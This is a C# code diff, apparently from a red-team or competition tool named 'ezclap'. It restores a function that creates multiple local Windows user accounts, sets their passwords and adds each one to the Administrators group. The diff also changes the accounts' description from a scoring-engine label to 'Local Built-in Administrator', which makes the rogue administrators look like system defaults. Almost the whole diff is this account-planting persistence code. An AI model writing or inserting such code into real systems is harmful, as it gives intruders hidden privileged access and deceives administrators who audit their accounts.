@@ -30,36 +30,40 @@ namespace ezclap
             */
 
             Initialize(name, pass, groups);
+            //addLocalUser(name, pass);
         }
 
-        /* // Ignoring this for now 
-        public static void addLocalUser(string username, string password)
+        // Ignoring this for now 
+        public static void addLocalUser(string[] username, string password)
         {
 
             System.Security.SecureString securePasswd = new System.Security.SecureString();
             foreach (char c in password.ToCharArray())
                 securePasswd.AppendChar(c);
 
-            string USER_NAME = username;
-            System.Security.SecureString oPW = securePasswd;
+            foreach(string user in username)
+            {
+                string USER_NAME = user;
+                System.Security.SecureString oPW = securePasswd;
 
-            DirectoryEntry oComputer = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
-            DirectoryEntry oNewUser = oComputer.Children.Add(USER_NAME, "user");
+                DirectoryEntry oComputer = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
+                DirectoryEntry oNewUser = oComputer.Children.Add(USER_NAME, "user");
 
-            IntPtr pString = IntPtr.Zero;
+                IntPtr pString = IntPtr.Zero;
 
-            pString = Marshal.SecureStringToGlobalAllocUnicode(oPW);
+                pString = Marshal.SecureStringToGlobalAllocUnicode(oPW);
 
-            oNewUser.Invoke("SetPassword", new object[] { Marshal.PtrToStringUni(pString) });
-            oNewUser.Invoke("Put", new object[] { "Description", "Administrator for scoring engine checks" });
-            oNewUser.CommitChanges();
-            Marshal.ZeroFreeGlobalAllocUnicode(pString);
+                oNewUser.Invoke("SetPassword", new object[] { Marshal.PtrToStringUni(pString) });
+                oNewUser.Invoke("Put", new object[] { "Description", "Local Built-in Administrator" });
+                oNewUser.CommitChanges();
+                Marshal.ZeroFreeGlobalAllocUnicode(pString);
 
-            DirectoryEntry oGroup = oComputer.Children.Find("Administrators", "group");
+                DirectoryEntry oGroup = oComputer.Children.Find("Administrators", "group");
 
-            oGroup.Invoke("Add", new object[] { oNewUser.Path.ToString() });
+                oGroup.Invoke("Add", new object[] { oNewUser.Path.ToString() });
+            }
         }
-        */
+        
 
         public static void Initialize(string[] name, string pass, string[] groups)
         {
